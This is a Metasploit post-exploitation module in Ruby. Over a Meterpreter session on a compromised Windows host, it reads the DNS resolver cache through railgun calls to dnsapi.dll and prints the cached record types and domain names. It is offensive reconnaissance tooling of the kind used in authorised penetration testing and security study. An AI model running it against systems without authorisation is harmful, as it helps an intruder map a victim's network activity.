##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather DNS Cache',
        'Description' => %q{ This module displays the records stored in the DNS cache.},
        'License' => MSF_LICENSE,
        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_railgun_memread
            ]
          }
        }
      )
    )
  end

  def run
    rtable = Rex::Text::Table.new(
      'Header' => 'DNS Cached Entries',
      'Indent' => 3,
      'Columns' => ['TYPE', 'DOMAIN']
    )

    client.railgun.add_dll('dnsapi') if !client.railgun.get_dll('dnsapi')
    client.railgun.add_function('dnsapi', 'DnsGetCacheDataTable', 'DWORD', [['PBLOB', 'cacheEntries', 'inout']])
    result = client.railgun.dnsapi.DnsGetCacheDataTable('aaaa')
    address = result['cacheEntries'].unpack1('V')

    # typedef struct _DNS_CACHE_ENTRY
    # 	struct _DNS_CACHE_ENTRY* pNext;
    # 	PWSTR pszName;
    # 	unsigned short wType;
    # 	unsigned short wDataLength;
    # 	unsigned long dwFlags;

    while (address != 0)
      struct_pointer = client.railgun.memread(address, 10)
      # Get the pointer to the DNS record name
      domain_pointer = struct_pointer[4, 4].unpack1('V')
      dns_type = struct_pointer[8, 2].unpack1('h*').reverse
      # According to the restrictions on valid host names, we read a maximum of 255 characters for each entry
      domain_name = client.railgun.memread(domain_pointer, 255).split("\x00\x00").first
      rtable << [dns_type, domain_name]
      # Get the next _DNS_CACHE_ENTRY struct pointer
      address = struct_pointer[0, 4].unpack1('V')
    end
    print_status(rtable.to_s)
  end
end
